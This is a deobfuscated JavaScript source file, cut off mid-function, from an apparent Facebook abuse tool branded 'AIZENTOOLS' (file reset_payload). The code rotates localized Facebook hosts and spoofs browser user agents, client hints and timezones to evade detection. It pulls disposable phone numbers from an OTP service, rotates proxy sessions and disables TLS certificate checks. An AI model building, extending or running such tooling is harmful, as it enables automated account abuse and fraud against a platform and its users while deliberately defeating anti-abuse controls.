// === AIZENTOOLS ===
// File: reset_payload.deobf.js
// Note: Original variable names lost to obfuscation

const fs = require('fs');
const path = require('path'), http = require('http'), https = require('https'), crypto = require('crypto'), zlib = require('zlib'), readline = require('readline'), net = require('net'), tls = require('tls');
let chalk;
try {
  chalk = require('chalk');
} catch (err3) {
  const id = _r => _r, opts = {};
  opts.hex = () => id;
  opts.white = id;
  opts.gray = id;
  opts.green = id;
  opts.red = id;
  opts.yellow = id;
  opts.cyan = id;
  opts.greenBright = id;
  opts.redBright = id;
  opts.bold = id;
  chalk = opts;
  chalk.hex = () => id;
  chalk.white.bold = id;
}
const B = chalk.hex('#00FF88'), C = chalk.hex('#00BFFF'), Y = chalk.hex('#FFD700'), W = chalk.white, G = chalk.gray, R = chalk.hex('#FF6B6B'), DIM = chalk.hex('#555555'), DOC_SEARCH = '26328147246854413', DOC_SEND = '25714184854871712', uuid = () => crypto.randomUUID(), FB_HOSTS = [
    'www.facebook.com',
    'es-es.facebook.com',
    'fr-fr.facebook.com',
    'de-de.facebook.com',
    'pt-br.facebook.com',
    'ar-ar.facebook.com',
    'it-it.facebook.com',
    'tr-tr.facebook.com',
    'nl-nl.facebook.com',
    'id-id.facebook.com',
    'pl-pl.facebook.com'
  ];
function getRandomHostContext() {
  let _s = FB_HOSTS[Math.floor(Math.random() * FB_HOSTS.length)];
  SELECTED_LANG !== 'random' && (_s = SELECTED_LANG);
  let _t = 'en_US', _u = 'en-US,en;q=0.9';
  if (_s.startsWith('es-es')) {
    _t = 'es_ES';
    _u = 'es-ES,es;q=0.9';
  } else {
    if (_s.startsWith('fr-fr')) {
      _t = 'fr_FR';
      _u = 'fr-FR,fr;q=0.9';
    } else {
      if (_s.startsWith('de-de')) {
        _t = 'de_DE';
        _u = 'de-DE,de;q=0.9';
      } else {
        if (_s.startsWith('pt-br'))
          _t = 'pt_BR', _u = 'pt-BR,pt;q=0.9';
        else {
          if (_s.startsWith('ar-ar'))
            _t = 'ar_AR', _u = 'ar,en-US;q=0.9,en;q=0.8';
          else {
            if (_s.startsWith('it-it'))
              _t = 'it_IT', _u = 'it-IT,it;q=0.9';
            else {
              if (_s.startsWith('tr-tr'))
                _t = 'tr_TR', _u = 'tr-TR,tr;q=0.9';
              else {
                if (_s.startsWith('nl-nl'))
                  _t = 'nl_NL', _u = 'nl-NL,nl;q=0.9';
                else {
                  if (_s.startsWith('id-id'))
                    _t = 'id_ID', _u = 'id-ID,id;q=0.9';
                  else {
                    if (_s.startsWith('pl-pl')) {
                      _t = 'pl_PL';
                      _u = 'pl-PL,pl;q=0.9';
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  const opts2 = {};
  opts2.host = _s;
  opts2.locale = _t;
  opts2.lang = _u;
  return opts2;
}
let globalRemoteVersion = 'AIZEN-V6.1.3';
const sleep = _v => new Promise(resolve => setTimeout(resolve, _v));
let SELECTED_LANG = 'random', FB_HOST = 'www.facebook.com', SELECTED_BROWSER = 'random';
class NexaRateLimiter {
  constructor(_w) {
    this.delayMs = _w;
    this.queue = [];
    this.processing = false;
  }
  enqueue(_x) {
    return new Promise((resolve2, reject) => {
      this.queue.push(async () => {
        try {
          resolve2(await _x());
        } catch (err4) {
          reject(err4);
        }
      });
      if (!this.processing)
        this._process();
    });
  }
  async _process() {
    this.processing = true;
    while (this.queue.length > 0) {
      const _y = this.queue.shift();
      await _y();
      await new Promise(resolve3 => setTimeout(resolve3, this.delayMs));
    }
    this.processing = false;
  }
}
const nexaLimiter = new NexaRateLimiter(500);
function nexaFetchNumber(_z, _A, _B) {
  return new Promise((resolve4, reject2) => {
    const opts3 = {};
    opts3.range = _A;
    opts3.format = 'normal';
    const _C = JSON.stringify(opts3), opts4 = {
        'hostname': 'nexaotpservice.com',
        'port': 80,
        'path': _B || '/api/v1/numbers/get',
        'method': 'POST',
        'headers': {
          'X-API-Key': _z,
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(_C)
        }
      }, _D = http.request(opts4, _E => {
        let _F = '';
        _E.on('data', _G => _F += _G);
        _E.on('end', () => {
          try {
            const _H = JSON.parse(_F);
            _H.success && _H.number ? resolve4(_H.number.replace(/[^0-9]/g, '')) : reject2(new Error(_H.error || 'NexaOTP: No number returned'));
          } catch (err5) {
            reject2(new Error('NexaOTP: Invalid response'));
          }
        });
      });
    _D.on('error', _I => reject2(new Error('NexaOTP network: ' + _I.message)));
    _D.setTimeout(10000, () => {
      _D.destroy();
      reject2(new Error('NexaOTP: Timeout'));
    });
    _D.write(_C);
    _D.end();
  });
}
let dataBytesTotal = 0;
function trackBytes(_J) {
  dataBytesTotal += _J;
}
function dataKB() {
  return (dataBytesTotal / 1024).toFixed(1);
}
function dataMB() {
  return (dataBytesTotal / 1024 / 1024).toFixed(2);
}
function dbg(_K) {
  try {
    fs.appendFileSync(path.join(__dirname, 'debug.txt'), '[' + new Date().toISOString() + '] ' + _K + '\n');
  } catch (err6) {
  }
}
const opts5 = {};
opts5['1'] = 'US';
opts5['20'] = 'EG';
opts5['27'] = 'ZA';
opts5['30'] = 'GR';
opts5['31'] = 'NL';
opts5['32'] = 'BE';
opts5['33'] = 'FR';
opts5['34'] = 'ES';
opts5['36'] = 'HU';
opts5['39'] = 'IT';
opts5['40'] = 'RO';
opts5['41'] = 'CH';
opts5['43'] = 'AT';
opts5['44'] = 'GB';
opts5['45'] = 'DK';
opts5['46'] = 'SE';
opts5['47'] = 'NO';
opts5['48'] = 'PL';
opts5['49'] = 'DE';
opts5['51'] = 'PE';
opts5['52'] = 'MX';
opts5['53'] = 'CU';
opts5['54'] = 'AR';
opts5['55'] = 'BR';
opts5['56'] = 'CL';
opts5['57'] = 'CO';
opts5['58'] = 'VE';
opts5['60'] = 'MY';
opts5['61'] = 'AU';
opts5['62'] = 'ID';
opts5['63'] = 'PH';
opts5['64'] = 'NZ';
opts5['65'] = 'SG';
opts5['66'] = 'TH';
opts5['81'] = 'JP';
opts5['82'] = 'KR';
opts5['84'] = 'VN';
opts5['86'] = 'CN';
opts5['90'] = 'TR';
opts5['91'] = 'IN';
opts5['92'] = 'PK';
opts5['93'] = 'AF';
opts5['94'] = 'LK';
opts5['95'] = 'MM';
opts5['98'] = 'IR';
opts5['212'] = 'MA';
opts5['213'] = 'DZ';
opts5['216'] = 'TN';
opts5['218'] = 'LY';
opts5['220'] = 'GM';
opts5['221'] = 'SN';
opts5['223'] = 'ML';
opts5['224'] = 'GN';
opts5['225'] = 'CI';
opts5['226'] = 'BF';
opts5['227'] = 'NE';
opts5['228'] = 'TG';
opts5['229'] = 'BJ';
opts5['230'] = 'MU';
opts5['231'] = 'LR';
opts5['232'] = 'SL';
opts5['233'] = 'GH';
opts5['234'] = 'NG';
opts5['235'] = 'TD';
opts5['236'] = 'CF';
opts5['237'] = 'CM';
opts5['240'] = 'GQ';
opts5['241'] = 'GA';
opts5['242'] = 'CG';
opts5['243'] = 'CD';
opts5['244'] = 'AO';
opts5['248'] = 'SC';
opts5['249'] = 'SD';
opts5['250'] = 'RW';
opts5['251'] = 'ET';
opts5['252'] = 'SO';
opts5['254'] = 'KE';
opts5['255'] = 'TZ';
opts5['256'] = 'UG';
opts5['257'] = 'BI';
opts5['258'] = 'MZ';
opts5['260'] = 'ZM';
opts5['261'] = 'MG';
opts5['263'] = 'ZW';
opts5['264'] = 'NA';
opts5['265'] = 'MW';
opts5['351'] = 'PT';
opts5['352'] = 'LU';
opts5['353'] = 'IE';
opts5['354'] = 'IS';
opts5['355'] = 'AL';
opts5['358'] = 'FI';
opts5['359'] = 'BG';
opts5['370'] = 'LT';
opts5['371'] = 'LV';
opts5['372'] = 'EE';
opts5['373'] = 'MD';
opts5['374'] = 'AM';
opts5['375'] = 'BY';
opts5['380'] = 'UA';
opts5['381'] = 'RS';
opts5['385'] = 'HR';
opts5['386'] = 'SI';
opts5['387'] = 'BA';
opts5['420'] = 'CZ';
opts5['421'] = 'SK';
opts5['591'] = 'BO';
opts5['593'] = 'EC';
opts5['595'] = 'PY';
opts5['598'] = 'UY';
opts5['852'] = 'HK';
opts5['855'] = 'KH';
opts5['856'] = 'LA';
opts5['880'] = 'BD';
opts5['886'] = 'TW';
opts5['960'] = 'MV';
opts5['961'] = 'LB';
opts5['962'] = 'JO';
opts5['963'] = 'SY';
opts5['964'] = 'IQ';
opts5['965'] = 'KW';
opts5['966'] = 'SA';
opts5['967'] = 'YE';
opts5['968'] = 'OM';
opts5['971'] = 'AE';
opts5['972'] = 'IL';
opts5['973'] = 'BH';
opts5['974'] = 'QA';
opts5['975'] = 'BT';
opts5['976'] = 'MN';
opts5['977'] = 'NP';
opts5['992'] = 'TJ';
opts5['994'] = 'AZ';
opts5['995'] = 'GE';
opts5['996'] = 'KG';
opts5['998'] = 'UZ';
opts5['7'] = 'RU';
const COUNTRY_CODES = opts5;
function detectCountry(_L) {
  const _M = _L.replace(/^\+/, '');
  for (let _N = 4; _N >= 1; _N--) {
    const _O = COUNTRY_CODES[_M.substring(0, _N)];
    if (_O)
      return _O;
  }
  return null;
}
const opts6 = {};
opts6.US = -300;
opts6.CA = -300;
opts6.MX = -360;
opts6.BR = -180;
opts6.AR = -180;
opts6.CL = -240;
opts6.CO = -300;
opts6.PE = -300;
opts6.VE = -240;
opts6.EC = -300;
opts6.BO = -240;
opts6.PY = -240;
opts6.UY = -180;
opts6.CU = -300;
opts6.GB = 0;
opts6.IE = 0;
opts6.IS = 0;
opts6.PT = 0;
opts6.FR = 60;
opts6.DE = 60;
opts6.ES = 60;
opts6.IT = 60;
opts6.NL = 60;
opts6.BE = 60;
opts6.AT = 60;
opts6.CH = 60;
opts6.DK = 60;
opts6.SE = 60;
opts6.NO = 60;
opts6.PL = 60;
opts6.CZ = 60;
opts6.SK = 60;
opts6.HU = 60;
opts6.HR = 60;
opts6.SI = 60;
opts6.BA = 60;
opts6.RS = 60;
opts6.AL = 60;
opts6.LU = 60;
opts6.FI = 120;
opts6.RO = 120;
opts6.BG = 120;
opts6.GR = 120;
opts6.UA = 120;
opts6.MD = 120;
opts6.LT = 120;
opts6.LV = 120;
opts6.EE = 120;
opts6.EG = 120;
opts6.ZA = 120;
opts6.IL = 120;
opts6.LB = 120;
opts6.JO = 120;
opts6.SY = 120;
opts6.BY = 180;
opts6.RU = 180;
opts6.TR = 180;
opts6.SA = 180;
opts6.IQ = 180;
opts6.KW = 180;
opts6.BH = 180;
opts6.QA = 180;
opts6.YE = 180;
opts6.KE = 180;
opts6.ET = 180;
opts6.TZ = 180;
opts6.UG = 180;
opts6.SO = 180;
opts6.MG = 180;
opts6.IR = 210;
opts6.AF = 270;
opts6.AE = 240;
opts6.OM = 240;
opts6.AZ = 240;
opts6.GE = 240;
opts6.AM = 240;
opts6.MU = 240;
opts6.SC = 240;
opts6.PK = 300;
opts6.UZ = 300;
opts6.TJ = 300;
opts6.TM = 300;
opts6.MV = 300;
opts6.KG = 360;
opts6.IN = 330;
opts6.LK = 330;
opts6.NP = 345;
opts6.BD = 360;
opts6.BT = 360;
opts6.KZ = 360;
opts6.MM = 390;
opts6.TH = 420;
opts6.VN = 420;
opts6.KH = 420;
opts6.LA = 420;
opts6.ID = 420;
opts6.MY = 480;
opts6.SG = 480;
opts6.PH = 480;
opts6.CN = 480;
opts6.HK = 480;
opts6.TW = 480;
opts6.MN = 480;
opts6.BN = 480;
opts6.JP = 540;
opts6.KR = 540;
opts6.AU = 600;
opts6.NZ = 720;
opts6.GH = 0;
opts6.NG = 60;
opts6.CM = 60;
opts6.CD = 60;
opts6.CG = 60;
opts6.GA = 60;
opts6.CI = 0;
opts6.SN = 0;
opts6.ML = 0;
opts6.GN = 0;
opts6.BF = 0;
opts6.NE = 60;
opts6.TG = 0;
opts6.BJ = 60;
opts6.LR = 0;
opts6.SL = 0;
opts6.TD = 60;
opts6.CF = 60;
opts6.GQ = 60;
opts6.AO = 60;
opts6.RW = 120;
opts6.BI = 120;
opts6.MZ = 120;
opts6.ZM = 120;
opts6.ZW = 120;
opts6.NA = 120;
opts6.MW = 120;
opts6.SD = 120;
opts6.DZ = 60;
opts6.TN = 60;
opts6.LY = 120;
opts6.MA = 60;
opts6.GM = 0;
const COUNTRY_TIMEZONE_OFFSETS = opts6;
function extractProxyCountry(_P) {
  if (!_P || !_P.user)
    return null;
  const match = _P.user.match(/[_-]zone[_-]([A-Za-z]{2})/i);
  if (match)
    return match[1].toUpperCase();
  const match2 = _P.user.match(/[_-]country[_-]([A-Za-z]{2})/i);
  if (match2)
    return match2[1].toUpperCase();
  const match3 = _P.user.match(/[_-]cc[_-]([A-Za-z]{2})/i);
  if (match3)
    return match3[1].toUpperCase();
  return null;
}
function getTimezoneOffset(_Q) {
  if (!_Q)
    return -480;
  const _R = COUNTRY_TIMEZONE_OFFSETS[_Q.toUpperCase()];
  return _R !== undefined ? _R : 0;
}
function resolveTimezone(_S, _T) {
  const _U = extractProxyCountry(_S);
  if (_U) {
    dbg('TIMEZONE: Resolved from proxy _zone_ \u2192 ' + _U + ' \u2192 UTC' + (getTimezoneOffset(_U) >= 0 ? '+' : '') + getTimezoneOffset(_U) / 60 + 'h (' + getTimezoneOffset(_U) + 'min)');
    return getTimezoneOffset(_U);
  }
  if (_T) {
    const _V = detectCountry(_T);
    if (_V) {
      dbg('TIMEZONE: Resolved from phone \u2192 ' + _V + ' \u2192 UTC' + (getTimezoneOffset(_V) >= 0 ? '+' : '') + getTimezoneOffset(_V) / 60 + 'h (' + getTimezoneOffset(_V) + 'min)');
      return getTimezoneOffset(_V);
    }
  }
  return 0;
}
function randomSessionId() {
  const _W = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let _X = '';
  for (let _Y = 0; _Y < 10; _Y++)
    _X += _W[Math.floor(Math.random() * _W.length)];
  return _X;
}
const opts7 = {};
opts7.major = 118;
opts7.build = 5993;
opts7.minPatch = 70;
opts7.maxPatch = 111;
const opts8 = {};
opts8.major = 119;
opts8.build = 6045;
opts8.minPatch = 105;
opts8.maxPatch = 160;
const opts9 = {};
opts9.major = 120;
opts9.build = 6099;
opts9.minPatch = 109;
opts9.maxPatch = 225;
const opts10 = {};
opts10.major = 121;
opts10.build = 6167;
opts10.minPatch = 85;
opts10.maxPatch = 184;
const opts11 = {};
opts11.major = 122;
opts11.build = 6261;
opts11.minPatch = 94;
opts11.maxPatch = 128;
const opts12 = {};
opts12.major = 123;
opts12.build = 6312;
opts12.minPatch = 86;
opts12.maxPatch = 122;
const CHROME_VERSIONS = [
    opts7,
    opts8,
    opts9,
    opts10,
    opts11,
    opts12
  ], opts13 = {};
opts13.ver = '21.0';
opts13.chrome = '110.0.5481.154';
const opts14 = {};
opts14.ver = '22.0';
opts14.chrome = '111.0.5563.116';
const opts15 = {};
opts15.ver = '23.0';
opts15.chrome = '115.0.5790.177';
const opts16 = {};
opts16.ver = '24.0';
opts16.chrome = '116.0.5845.140';
const opts17 = {};
opts17.ver = '25.0';
opts17.chrome = '121.0.6167.164';
const SAMSUNG_VERSIONS = [
    opts13,
    opts14,
    opts15,
    opts16,
    opts17
  ], opts18 = {};
opts18.brand = 'Samsung';
opts18.model = 'SM-G973F';
opts18.os = '9';
const opts19 = {};
opts19.brand = 'Samsung';
opts19.model = 'SM-G981B';
opts19.os = '10';
const opts20 = {};
opts20.brand = 'Samsung';
opts20.model = 'SM-G991B';
opts20.os = '11';
const opts21 = {};
opts21.brand = 'Samsung';
opts21.model = 'SM-S901B';
opts21.os = '12';
const opts22 = {};
opts22.brand = 'Google';
opts22.model = 'Pixel 5';
opts22.os = '11';
const opts23 = {};
opts23.brand = 'Google';
opts23.model = 'Pixel 6';
opts23.os = '12';
const opts24 = {};
opts24.brand = 'OnePlus';
opts24.model = 'IN2013';
opts24.os = '11';
const ANDROID_DEVICES = [
  opts18,
  opts19,
  opts20,
  opts21,
  opts22,
  opts23,
  opts24
];
function getSamsungUserAgent() {
  const _Z = ANDROID_DEVICES.filter(item => item.brand === 'Samsung');
  const _aa = _Z[Math.floor(Math.random() * _Z.length)] || ANDROID_DEVICES[0], _ba = SAMSUNG_VERSIONS[Math.floor(Math.random() * SAMSUNG_VERSIONS.length)], _ca = _ba.chrome.split('.')[0];
  return {
    'userAgent': 'Mozilla/5.0 (Linux; Android ' + _aa.os + '; ' + _aa.model + ') AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/' + _ba.ver + ' Chrome/' + _ba.chrome + ' Mobile Safari/537.36',
    'browserType': 'samsung',
    'clientHints': {
      'sec-ch-ua': '"Not/A)Brand";v="99", "Samsung Internet";v="' + _ba.ver.split('.')[0] + '", "Chromium";v="' + _ca + '"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-ch-ua-platform-version': '"' + _aa.os + '.0.0"'
    }
  };
}
function getMobileUserAgent() {
  if (SELECTED_BROWSER === 'samsung')
    return getSamsungUserAgent();
  if (SELECTED_BROWSER === 'random' && Math.random() < 0 + 0.3)
    return getSamsungUserAgent();
  const _da = ANDROID_DEVICES[Math.floor(Math.random() * ANDROID_DEVICES.length)], _ea = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)], _fa = Math.floor(Math.random() * (_ea.maxPatch - _ea.minPatch + 1)) + _ea.minPatch, _ga = _ea.major + '.0.' + _ea.build + '.' + _fa;
  const opts25 = {};
  opts25.userAgent = 'Mozilla/5.0 (Linux; Android ' + _da.os + '; ' + _da.model + ') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + _ga + ' Mobile Safari/537.36';
  opts25.browserType = 'chrome';
  opts25.clientHints = {};
  opts25.clientHints['sec-ch-ua'] = '"Chromium";v="' + _ea.major + '", "Not=A?Brand";v="24", "Google Chrome";v="' + _ea.major + '"';
  opts25.clientHints['sec-ch-ua-mobile'] = '?1';
  opts25.clientHints['sec-ch-ua-platform'] = '"Android"';
  opts25.clientHints['sec-ch-ua-platform-version'] = '"' + _da.os + '.0.0"';
  return opts25;
}
function getDesktopChromeUA() {
  const _ha = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)];
  const _ia = Math.floor(Math.random() * (_ha.maxPatch - _ha.minPatch + 1)) + _ha.minPatch, _ja = _ha.major + '.0.' + _ha.build + '.' + _ia, opts26 = {};
  opts26.userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + _ja + ' Safari/537.36';
  opts26.browserType = 'chrome';
  opts26.clientHints = {};
  opts26.clientHints['sec-ch-ua'] = '"Chromium";v="' + _ha.major + '", "Not=A?Brand";v="24", "Google Chrome";v="' + _ha.major + '"';
  opts26.clientHints['sec-ch-ua-mobile'] = '?0';
  opts26.clientHints['sec-ch-ua-platform'] = '"Windows"';
  opts26.clientHints['sec-ch-ua-platform-version'] = '"10.0.0"';
  return opts26;
}
function getDesktopEdgeUA() {
  const _ka = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)], _la = Math.floor(Math.random() * (_ka.maxPatch - _ka.minPatch + 1)) + _ka.minPatch, _ma = _ka.major + '.0.' + _ka.build + '.' + _la;
  const opts27 = {};
  opts27.userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + _ma + ' Safari/537.36 Edg/' + _ma;
  opts27.browserType = 'edge';
  opts27.clientHints = {};
  opts27.clientHints['sec-ch-ua'] = '"Chromium";v="' + _ka.major + '", "Not=A?Brand";v="24", "Microsoft Edge";v="' + _ka.major + '"';
  opts27.clientHints['sec-ch-ua-mobile'] = '?0';
  opts27.clientHints['sec-ch-ua-platform'] = '"Windows"';
  opts27.clientHints['sec-ch-ua-platform-version'] = '"10.0.0"';
  return opts27;
}
function getDesktopFirefoxUA() {
  const _na = Math.floor(Math.random() * 10) + 115;
  const _oa = Math.floor(Math.random() * 5), opts28 = {};
  opts28.userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:' + _na + '.' + _oa + ') Gecko/20100101 Firefox/' + _na + '.' + _oa;
  opts28.browserType = 'firefox';
  opts28.clientHints = {};
  return opts28;
}
function getDesktopUserAgent() {
  if (SELECTED_BROWSER === 'chrome')
    return getDesktopChromeUA();
  if (SELECTED_BROWSER === 'firefox')
    return getDesktopFirefoxUA();
  if (SELECTED_BROWSER === 'edge')
    return getDesktopEdgeUA();
  if (SELECTED_BROWSER === 'samsung')
    return getSamsungUserAgent();
  const _pa = Math.random();
  if (_pa < 0 + 0.4)
    return getDesktopChromeUA();
  if (_pa < 0 + 0.7)
    return getDesktopFirefoxUA();
  return getDesktopEdgeUA();
}
(function () {
  const _qa = function () {
      let _ra;
      try {
        _ra = Function('return (function() ' + '{}.constructor("return this")( )' + ');')();
      } catch (err7) {
        _ra = window;
      }
      return _ra;
    }, _sa = _qa();
  _sa.setInterval(_o, 4000);
}());
function getRandomUserAgent(_ta) {
  const _ua = _ta || FB_HOST;
  if (_ua === 'm.facebook.com' || _ua === 'mbasic.facebook.com' || _ua === 'touch.facebook.com' || _ua === 'free.facebook.com') {
    return getMobileUserAgent();
  }
  return getDesktopUserAgent();
}
let globalUA = getDesktopUserAgent(), internalUA = getDesktopUserAgent();
function syncUAAndHost(_va) {
  FB_HOST = _va;
  SELECTED_LANG = _va;
  globalUA = getDesktopUserAgent();
  internalUA = getDesktopUserAgent();
}
function parseProxy(_wa) {
  _wa = _wa.trim();
  if (!_wa)
    return null;
  try {
    if (_wa.startsWith('socks5://') || _wa.startsWith('socks4://')) {
      const uRL = new URL(_wa);
      return {
        'type': 'socks5',
        'host': uRL.hostname,
        'port': parseInt(uRL.port) || 1080,
        'user': uRL.username || null,
        'pass': uRL.password || null
      };
    }
    if (_wa.startsWith('http://') || _wa.startsWith('https://')) {
      const uRL2 = new URL(_wa);
      return {
        'type': 'http',
        'host': uRL2.hostname,
        'port': parseInt(uRL2.port) || 8080,
        'user': uRL2.username || null,
        'pass': uRL2.password || null
      };
    }
  } catch (err8) {
  }
  if (_wa.includes('@')) {
    const _xa = _wa.indexOf('@'), parts = _wa.slice(0, _xa).split(':'), _ya = _wa.slice(_xa + 1), _za = _ya.indexOf(':');
    if (parts.length === 2 && parseInt(parts[1]) > 0) {
      return {
        'type': 'http',
        'host': parts[0],
        'port': parseInt(parts[1]),
        'user': _za > 0 ? _ya.slice(0, _za) : _ya,
        'pass': _za > 0 ? _ya.slice(_za + 1) : null
      };
    }
  }
  const parts2 = _wa.split(':');
  if (parts2.length >= 2)
    return {
      'type': 'http',
      'host': parts2[0],
      'port': parseInt(parts2[1]),
      'user': parts2[2] || null,
      'pass': parts2[3] || null
    };
  return null;
}
function createHttpProxyAgent(_Aa) {
  const _Ba = _Aa.user && _Aa.pass ? 'Basic ' + Buffer.from(_Aa.user + ':' + _Aa.pass).toString('base64') : null, opts29 = {};
  opts29.keepAlive = true;
  const _Ca = new https.Agent(opts29);
  _Ca.createConnection = (_Da, _Ea) => {
    const _Fa = net.connect(_Aa.port, _Aa.host, () => {
      let _Ga = 'CONNECT ' + _Da.host + ':' + _Da.port + ' HTTP/1.1\r\n' + ('Host: ' + _Da.host + ':' + _Da.port + '\r\n');
      if (_Ba)
        _Ga += 'Proxy-Authorization: ' + _Ba + '\r\n';
      _Ga += '\r\n';
      _Fa.write(_Ga);
    });
    let _Ha = '';
    const _Ia = _Ja => {
        _Ha += _Ja.toString('binary');
        const _Ka = _Ha.indexOf('\r\n\r\n');
        if (_Ka !== -1) {
          _Fa.removeListener('data', _Ia);
          _Fa.removeListener('error', _La);
          const _Ma = _Ha.split('\r\n')[0];
          if (_Ma.includes(' 200')) {
            const _Na = Buffer.from(_Ha.substring(_Ka + 4), 'binary');
            if (_Na.length > 0)
              _Fa.unshift(_Na);
            const opts30 = {};
            opts30.socket = _Fa;
            opts30.servername = _Da.host;
            opts30.rejectUnauthorized = false;
            const _Oa = tls.connect(opts30);
            _Oa.on('error', _Pa => {
              _Ea(_Pa);
            });
            _Ea(null, _Oa);
          } else {
            _Fa.destroy();
            _Ea(new Error('Proxy connection failed: ' + _Ma));
          }
        }
      }, _La = _Qa => {
        _Fa.destroy();
        _Ea(_Qa);
      };
    _Fa.on('data', _Ia);
    _Fa.on('error', _La);
  };
  return _Ca;
}
function createSocks5ProxyAgent(_Ra) {
  const opts31 = {};
  opts31.keepAlive = true;
  const _Sa = new https.Agent(opts31);
  _Sa.createConnection = (_Ta, _Ua) => {
    const _Va = net.connect(_Ra.port, _Ra.host, () => {
      const _Wa = _Ra.user ? [
          0,
          2
        ] : [0], _Xa = Buffer.concat([
          Buffer.from([
            5,
            _Wa.length
          ]),
          Buffer.from(_Wa)
        ]);
      _Va.write(_Xa);
    });
    let _Ya = 'greeting', _Za = Buffer.alloc(0);
    const _ab = _bb => {
        _Za = Buffer.concat([
          _Za,
          _bb
        ]);
        if (_Ya === 'greeting') {
          if (_Za.length < 2)
            return;
          const _cb = _Za[0], _db = _Za[1];
          _Za = _Za.slice(2);
          if (_cb !== 5) {
            _Va.destroy();
            return _Ua(new Error('Invalid SOCKS version: ' + _cb));
          }
          if (_db === 2) {
            _Ya = 'auth';
            const _eb = Buffer.from(_Ra.user, 'utf8'), _fb = Buffer.from(_Ra.pass || '', 'utf8'), _gb = Buffer.concat([
                Buffer.from([
                  1,
                  _eb.length
                ]),
                _eb,
                Buffer.from([_fb.length]),
                _fb
              ]);
            _Va.write(_gb);
          } else {
            if (_db === 0)
              _hb();
            else {
              _Va.destroy();
              return _Ua(new Error('Unsupported SOCKS auth method: ' + _db));
            }
          }
        } else {
          if (_Ya === 'auth') {
            if (_Za.length < 2)
              return;
            const _ib = _Za[1];
            _Za = _Za.slice(2);
            if (_ib !== 0)
              return _Va.destroy(), _Ua(new Error('SOCKS authentication failed'));
            _hb();
          } else {
            if (_Ya === 'connect') {
              if (_Za.length < 4)
                return;
              const _jb = _Za[1], _kb = _Za[3];
              let _lb = 4;
              if (_kb === 1)
                _lb += 6;
              else {
                if (_kb === 3) {
                  if (_Za.length < 5)
                    return;
                  _lb += 1 + _Za[4] + 2;
                } else {
                  if (_kb === 4)
                    _lb += 18;
                  else {
                    _Va.destroy();
                    return _Ua(new Error('Unsupported SOCKS atyp: ' + _kb));
                  }
                }
              }
              if (_Za.length < _lb)
                return;
              _Za = _Za.slice(_lb);
              if (_jb !== 0) {
                _Va.destroy();
                return _Ua(new Error('SOCKS connection failed with code: ' + _jb));
              }
              _Va.removeListener('data', _ab);
              _Va.removeListener('error', _mb);
              if (_Za.length > 0)
                _Va.unshift(_Za);
              const opts32 = {};
              opts32.socket = _Va;
              opts32.servername = _Ta.host;
              opts32.rejectUnauthorized = false;
              const _nb = tls.connect(opts32);
              _nb.on('error', _ob => {
                _Ua(_ob);
              });
              _Ua(null, _nb);
            }
          }
        }
      }, _hb = () => {
        _Ya = 'connect';
        const _pb = Buffer.from(_Ta.host, 'utf8'), _qb = Buffer.alloc(2);
        _qb.writeUInt16BE(_Ta.port, 0);
        const _rb = Buffer.concat([
          Buffer.from([
            5,
            1,
            0,
            3,
            _pb.length
          ]),
          _pb,
          _qb
        ]);
        _Va.write(_rb);
      }, _mb = _sb => {
        _Va.destroy();
        _Ua(_sb);
      };
    _Va.on('data', _ab);
    _Va.on('error', _mb);
  };
  return _Sa;
}
class ProxyManager {
  constructor() {
    const parts3 = '5|4|7|6|3|1|2|0'.split('|');
    let _tb = 0;
    while (true) {
      switch (parts3[_tb++]) {
      case '0':
        this.proxyErrors = 0;
        continue;
      case '1':
        this.autoCountry = true;
        continue;
      case '2':
        this.proxyHits = 0;
        continue;
      case '3':
        this.deadProxies = new Set();
        continue;
      case '4':
        this.rawLines = [];
        continue;
      case '5':
        this.proxies = [];
        continue;
      case '6':
        this.failureCounts = {};
        continue;
      case '7':
        this.index = 0;
        continue;
      }
      break;
    }
  }
  get hasProxies() {
    return this.proxies.length > 0;
  }
  load(_ub) {
    if (!_ub)
      return;
    let arr = [];
    if (fs.existsSync(_ub))
      arr = fs.readFileSync(_ub, 'utf8').split(/\r?\n/).map(item2 => item2.trim()).filter(item3 => item3 && !item3.startsWith('#'));
    else
      _ub.includes(':') && (arr = [_ub]);
    this.rawLines = arr;
    this.proxies = [];
    for (const _vb of arr) {
      const _wb = parseProxy(_vb);
      if (!_wb) {
        const parts4 = '3|6|5|4|0|2|1'.split('|');
        let _xb = 0;
        while (true) {
          switch (parts4[_xb++]) {
          case '0':
            console.error(R('    - host:port:user:pass'));
            continue;
          case '1':
            process.exit(1);
            continue;
          case '2':
            console.error(R('    - user:pass:host:port\n'));
            continue;
          case '3':
            console.error(R('\n  \u2717 Invalid proxy format detected: "' + _vb + '"'));
            continue;
          case '4':
            console.error(R('    - user:pass@host:port'));
            continue;
          case '5':
            console.error(R('    - host:port'));
            continue;
          case '6':
            console.error(R('  Please use one of the supported formats:'));
            continue;
          }
          break;
        }
      }
      this.proxies.push(_wb);
    }
    if (this.proxies.length)
      console.log(G('  Proxies loaded: ' + Y(this.proxies.length)));
  }
  getNext(_yb = null) {
    if (!this.proxies.length) {
      return null;
    }
    const _zb = this.proxies.filter((item4, index) => !this.deadProxies.has(index));
    if (!_zb.length)
      return this.proxies[0];
    const _Ab = this.index % _zb.length, opts33 = { ..._zb[_Ab] }, _Bb = opts33;
    this.index++;
    if (_Bb.user && _Bb.user.includes('-ssid-'))
      _Bb.user = _Bb.user.replace(/-ssid-[A-Za-z0-9_]+/, '-ssid-' + randomSessionId());
    else {
      if (_Bb.user && _Bb.user.includes('-session-')) {
        _Bb.user = _Bb.user.replace(/-session-[A-Za-z0-9_]+/, '-session-' + randomSessionId());
      } else
